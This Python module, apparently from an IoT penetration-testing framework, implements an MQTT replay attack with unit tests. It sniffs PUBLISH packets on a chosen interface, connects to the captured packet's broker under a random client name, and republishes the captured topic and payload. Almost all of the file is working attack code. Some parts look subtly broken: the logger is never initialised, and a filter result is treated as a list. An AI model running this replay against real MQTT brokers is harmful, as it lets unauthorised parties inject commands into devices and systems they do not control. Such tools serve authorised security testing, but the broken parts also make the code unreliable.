import logging
import signal
import time
import unittest

import paho.mqtt.client as paho

from protocols.MQTT.mqtt_scanner import MQTTScanner
from Entity.attack import Attack
from Entity.input_format import InputFormat
from Utils.RandomUtil import random_generated_names
from Utils.SnifferUtil import generic_sniffer


class MQTTReplayAttack(Attack):
    """
    MQTT Protocol - Replay Attack Module
    Performs a replay attack using the inputs which are provided by the user
    """
    client = None
    captured_packets = None

    # Input Fields
    selected_index = 0
    timeout = generic_sniffer.DEFAULT_SNIFF_TIMEOUT
    interface = generic_sniffer.DEFAULT_INTERFACE

    # Miscellaneous Members
    logger = None

    def __init__(self):
        default_parameters = ["", 10.0, "any"]
        inputs = [
            InputFormat("Selected packet index", "selected_index", self.selected_index, int, mandatory=True),
            InputFormat("Timeout", "timeout", self.timeout, float),
            InputFormat("Interface", "interface", str(self.interface), str, mandatory=True)
        ]
        Attack.__init__(self, "MQTT Replay Attack", inputs, default_parameters,
                        "Performs a replay attack using the inputs\n"
                        "which are provided by the user.")

        logging.basicConfig(level=logging.DEBUG, format="%(asctime)s:%(levelname)s:%(name)s:%(message)s")

        # Signal handler to exit from function
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, sig, frame):
        self.stop_attack()

    def stop_attack(self):
        self.logger.info("Exitting...")
        if self.client is not None:
            self.client.disconnect()  # Close the connection before exitting
        time.sleep(2)  # Sleep two seconds so the user can see the message
        # sys.exit(0)

    def pre_attack_init(self):
        try:
            assert self.selected_index >= 0
        except AssertionError as _:
            self.logger.error("Invalid selected packet value!")
            raise
        try:
            assert self.selected_index < len(self.captured_packets)
        except AssertionError as _:
            self.logger.error("Input value exceeds captured packets' size!")
            raise
        self.client = paho.Client(random_generated_names.get_random_client_name())

    def run(self):
        Attack.run(self)
        self.pre_attack_process()  # Sniff the packets so we can replay
        self.pre_attack_init()  # Do the necessary checks
        try:
            selected_packet = self.captured_packets[self.selected_index]
            try:
                self.client.connect(selected_packet.ip.dst_host)
            except Exception as e:
                self.logger.error("Failed to connect to broker")

            self.logger.info(selected_packet)
            self.client.publish(selected_packet.mqtt.topic, selected_packet.mqtt.msg)
        except IndexError as _:
            self.logger.error("Invalid packet index. Indices start from 0...")

    def pre_attack_process(self):
        """
        TODO Need to think how we can integrate such a pre_called method to GUI before attack execution
        Scans valid packets to be replayed
        """
        super(MQTTReplayAttack, self).set_input_value("timeout")
        try:
            assert self.timeout >= 0
            self.captured_packets = MQTTScanner().scan(self.timeout, self.interface)
            self.captured_packets = filter(lambda _: int(_.mqtt.msgtype) << 4 == paho.PUBLISH, self.captured_packets)
        except AssertionError as _:
            self.logger.error("Invalid timeout for scan operation!")


class TestMQTTReplayAttack(unittest.TestCase):
    def setUp(self):
        self.mqtt_replay_attack = MQTTReplayAttack()

    def tearDown(self):
        pass

    def test_name(self):
        self.assertEqual("MQTT Replay Attack", self.mqtt_replay_attack.get_attack_name())

    def test_non_initialized_inputs(self):
        inputs = self.mqtt_replay_attack.get_inputs()
        for _input in inputs:
            value = getattr(self.mqtt_replay_attack, _input.get_name())
            self.assertTrue(value is None or type(value) == _input.get_type())

    def test_after_getting_inputs(self):
        example_inputs = [8, 13.2, "test-interface"]
        for index, _input in enumerate(example_inputs):
            self.mqtt_replay_attack.inputs[index].set_value(_input)

        super(MQTTReplayAttack, self.mqtt_replay_attack).run()

        inputs = self.mqtt_replay_attack.get_inputs()
        for index, _input in enumerate(inputs):
            value = getattr(self.mqtt_replay_attack, _input.get_name())
            self.assertEqual(example_inputs[index], value)

    def test_replay_attack(self):
        example_inputs = [0, 15., "any"]
        for index, _input in enumerate(example_inputs):
            self.mqtt_replay_attack.inputs[index].set_value(_input)

        self.mqtt_replay_attack.pre_attack_process()
        packets = self.mqtt_replay_attack.captured_packets

        self.assertIsNotNone(packets)
        self.assertTrue(type(packets) == list)
        self.assertGreaterEqual(len(packets), 0)
        if len(packets) > 0:
            self.mqtt_replay_attack.run()
            self.assertTrue(True)
        else:
            self.assertTrue(False)


if __name__ == '__main__':
    unittest.main()
